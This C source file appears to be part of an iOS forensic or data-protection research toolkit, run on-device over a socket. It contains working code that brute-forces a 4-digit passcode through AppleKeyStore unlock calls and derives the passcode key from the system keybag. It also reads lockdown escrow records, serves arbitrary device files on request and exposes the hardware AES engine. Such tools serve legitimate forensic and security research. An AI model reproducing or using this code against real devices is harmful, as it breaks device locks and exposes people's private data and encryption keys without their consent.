#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <CoreFoundation/CoreFoundation.h>
#include "AppleKeyStore.h"
#include "IOKit.h"
#include "IOAESAccelerator.h"
#include "registry.h"
#include "util.h"
#include "plist_server.h"
#include "remote_functions.h"

int bruteforceProgressCallback(void* ctx, int p)
{
    return send_progress_message((int) ctx, p, 10000);
}

char* bruteforceWithAppleKeyStore(CFDataRef kbkeys, int (*callback)(void*,int), void* ctx)
{
    uint64_t keybag_id = 0;
    int i;

    char* passcode = (char*) malloc(5);
    memset(passcode, 0, 5);

    AppleKeyStoreKeyBagInit();

    int r = AppleKeyStoreKeyBagCreateWithData(kbkeys, &keybag_id);
    if (r)
    {
        printf("AppleKeyStoreKeyBagCreateWithData ret=%x\n", r);
        free(passcode);
        return NULL;
    }
    //printf("keybag id=%x\n", (uint32_t) keybag_id);
    AppleKeyStoreKeyBagSetSystem(keybag_id);
    
    CFDataRef data = CFDataCreateWithBytesNoCopy(0, (const UInt8*) passcode, 4, kCFAllocatorNull);
    
    io_connect_t conn = IOKit_getConnect("AppleKeyStore");
    
    if (!AppleKeyStoreUnlockDevice(conn, data))
    {
        CFRelease(data);
        return passcode;
    }

    for(i=0; i < 10000; i++)
    {
        sprintf(passcode, "%04d", i);
        if (callback != NULL && !(i % 10))
        {
            if (callback(ctx, i) == -1)
            {
                printf("Bruteforce abort\n");
                break;
            }
        }
        if (!AppleKeyStoreUnlockDevice(conn, data))
        {
            CFRelease(data);
            return passcode;
        }
    }
    free(passcode);
    CFRelease(data);
    return NULL;
}

CFDictionaryRef load_system_keybag(int socket, CFDictionaryRef dict)
{
    CFDictionaryRef kbdict = AppleKeyStore_loadKeyBag("/private/var/keybags","systembag");
    
    if (kbdict == NULL)
    {
        mountDataPartition("/mnt2");
        
        kbdict = AppleKeyStore_loadKeyBag("/mnt2/keybags","systembag");
        if (kbdict == NULL)
        {
            printf("FAILed to load keybag\n");
            return NULL;
        }
    }
    return kbdict;
}

CFDictionaryRef bruteforce_system_keybag(int socket, CFDictionaryRef dict)
{
    uint8_t passcodeKey[32];
    
    CFDataRef kbkeys = CFDictionaryGetValue(dict, CFSTR("KeyBagKeys")); 
    if(kbkeys == NULL || CFGetTypeID(kbkeys) != CFDataGetTypeID())
        return NULL;

    char* passcode = bruteforceWithAppleKeyStore(kbkeys, bruteforceProgressCallback, (void*) socket);
    
    if (passcode == NULL)
        return NULL;

    KeyBag* kb = AppleKeyStore_parseBinaryKeyBag(kbkeys);
    if (kb == NULL)
    {
        printf("FAIL: AppleKeyStore_parseBinaryKeyBag\n");
        return NULL;
    }
    AppleKeyStore_getPasscodeKey(kb, passcode, strlen(passcode), passcodeKey);
    
    free(kb);
    CFMutableDictionaryRef out  = CFDictionaryCreateMutable(kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);	
    CFStringRef cfpasscode = CFStringCreateWithCString(kCFAllocatorDefault, passcode, kCFStringEncodingASCII);
    CFDictionaryAddValue(out, CFSTR("passcode"), cfpasscode);
    CFRelease(cfpasscode);
    
    addHexaString(out, CFSTR("passcodeKey"), passcodeKey, 32);
    return out;
}

CFDictionaryRef keybag_get_passcode_key(int socket, CFDictionaryRef dict)
{
    uint8_t passcodeKey[32];
    CFDataRef passcode_cfdata = NULL;
    
    CFDataRef kbkeys = CFDictionaryGetValue(dict, CFSTR("KeyBagKeys")); 
    if(kbkeys == NULL || CFGetTypeID(kbkeys) != CFDataGetTypeID())
        return NULL;
    
    KeyBag* kb = AppleKeyStore_parseBinaryKeyBag(kbkeys);
    if (kb == NULL)
        return NULL;

    CFTypeRef cfpasscode = CFDictionaryGetValue(dict, CFSTR("passcode"));
    
    if(cfpasscode == NULL)
        return NULL;
    if(CFGetTypeID(cfpasscode) == CFDataGetTypeID())
    {
        passcode_cfdata = cfpasscode;
    }
    else if(CFGetTypeID(cfpasscode) == CFStringGetTypeID())
    {
        passcode_cfdata = CFStringCreateExternalRepresentation(kCFAllocatorDefault, cfpasscode, kCFStringEncodingUTF8, 0);
    }
    else
        return NULL;
    
    AppleKeyStore_getPasscodeKey(kb,
                                CFDataGetBytePtr(passcode_cfdata),
                                CFDataGetLength(passcode_cfdata),
                                passcodeKey);
    free(kb);
    
    if (passcode_cfdata != cfpasscode)
        CFRelease(passcode_cfdata);
    
    CFMutableDictionaryRef out  = CFDictionaryCreateMutable(kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);	
    CFDictionaryAddValue(out, CFSTR("passcode"), cfpasscode);
    addHexaString(out, CFSTR("passcodeKey"), passcodeKey, 32);
    return out;
}

CFDictionaryRef get_escrow_record(int socket, CFDictionaryRef dict)
{
    CFStringRef hostid = CFDictionaryGetValue(dict, CFSTR("HostID"));
    if(hostid == NULL || CFGetTypeID(hostid) != CFStringGetTypeID())
        return NULL;
    
    //TODO: check return values...
    CFStringRef path = CFStringCreateWithFormat(kCFAllocatorDefault, NULL, CFSTR("/mnt2/root/Library/Lockdown/escrow_records/%@.plist"), hostid);
    //CFStringRef path = CFStringCreateWithFormat(kCFAllocatorDefault, NULL, CFSTR("/private/var/root/Library/Lockdown/escrow_records/%@.plist"), hostid);

    CFURLRef fileURL = CFURLCreateWithFileSystemPath(kCFAllocatorDefault, path, kCFURLPOSIXPathStyle, FALSE);
    CFReadStreamRef stream = CFReadStreamCreateWithFile(kCFAllocatorDefault, fileURL);
    CFReadStreamOpen(stream);
    CFPropertyListRef plist = CFPropertyListCreateWithStream(kCFAllocatorDefault,
                        stream, 0, kCFPropertyListImmutable, NULL, NULL);

    CFRelease(fileURL);
    CFRelease(stream);
    CFRelease(path);
    return plist;
}

CFDictionaryRef download_file(int socket, CFDictionaryRef dict)
{
    UInt8 buffer[8192];
    CFIndex bytesRead;

    CFStringRef path = CFDictionaryGetValue(dict, CFSTR("Path"));
    if(path == NULL || CFGetTypeID(path) != CFStringGetTypeID())
        return NULL;
    CFMutableDictionaryRef out  = CFDictionaryCreateMutable(kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);	

    CFURLRef fileURL = CFURLCreateWithFileSystemPath(kCFAllocatorDefault, path, kCFURLPOSIXPathStyle, FALSE);
    CFReadStreamRef stream = CFReadStreamCreateWithFile(kCFAllocatorDefault, fileURL);
    CFRelease(fileURL);
    if(!CFReadStreamOpen(stream))
    {
        CFErrorRef error = CFReadStreamCopyError(stream);
        if (error != NULL)
        {
            CFStringRef errorDesc = CFErrorCopyDescription(error);
            CFDictionaryAddValue(out, CFSTR("Error"), errorDesc);
            CFRelease(errorDesc);
            CFRelease(error);
        }
        CFRelease(stream);
        return out;
    }
    CFMutableDataRef data = CFDataCreateMutable(kCFAllocatorDefault, 0);

    while(CFReadStreamHasBytesAvailable(stream))
    {
        if((bytesRead = CFReadStreamRead(stream, buffer, 8192)) <= 0)
            break;
        CFDataAppendBytes(data, buffer, bytesRead);
    }
    CFReadStreamClose(stream);
    CFRelease(stream);

    CFDictionaryAddValue(out, CFSTR("Data"), data);
    CFRelease(data);

    return out;
}

CFDictionaryRef remote_aes(int socket, CFDictionaryRef dict)
{
    uint8_t* input2 = NULL;
    uint32_t len = 0;
    uint8_t* iv2 = NULL;
    uint32_t keyMask = 0;
    uint32_t mode = 0;
    uint32_t bits = 0;
    
    CFNumberRef km =  CFDictionaryGetValue(dict, CFSTR("keyMask"));
    if(km == NULL || CFGetTypeID(km) != CFNumberGetTypeID())
        return NULL;
    CFNumberGetValue(km, kCFNumberIntType, &keyMask);
    
    CFNumberRef m =  CFDictionaryGetValue(dict, CFSTR("mode"));
    if(m == NULL || CFGetTypeID(m) != CFNumberGetTypeID())
        return NULL;
    CFNumberGetValue(m, kCFNumberIntType, &mode);
    
    CFNumberRef b =  CFDictionaryGetValue(dict, CFSTR("bits"));
    if(b == NULL || CFGetTypeID(b) != CFNumberGetTypeID())
        return NULL;
    CFNumberGetValue(b, kCFNumberIntType, &bits);
    
    CFDataRef input = CFDictionaryGetValue(dict, CFSTR("input"));
    if(input == NULL || CFGetTypeID(input) != CFDataGetTypeID())
        return NULL;

    CFDataRef iv = CFDictionaryGetValue(dict, CFSTR("iv"));
    if(iv != NULL)
    {
        if (CFGetTypeID(iv) != CFDataGetTypeID())
            return NULL;
        iv2 = (uint8_t*) CFDataGetBytePtr(iv);
    }
    len = CFDataGetLength(input);
    if (len % 16 != 0)
    {
        return NULL;
    }
    input2 = malloc(len);
    if (input2 == NULL)
    {
        return NULL;
    }

    memcpy(input2, CFDataGetBytePtr(input), len);
    
    uint32_t ret = doAES(input2, input2, len, keyMask, NULL, iv2, mode, bits);

    CFMutableDictionaryRef out  = CFDictionaryCreateMutable(kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);	
    
    CFNumberRef retCode = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &ret);
    CFDictionaryAddValue(out, CFSTR("returnCode"), retCode);
    CFRelease(retCode);
 
    if (ret == 0)
    {
        CFDataRef dd = CFDataCreate(kCFAllocatorDefault, input2, len);
        CFDictionaryAddValue(out, CFSTR("data"), dd);
        CFRelease(dd);
    }
    free(input2);

    return out;
}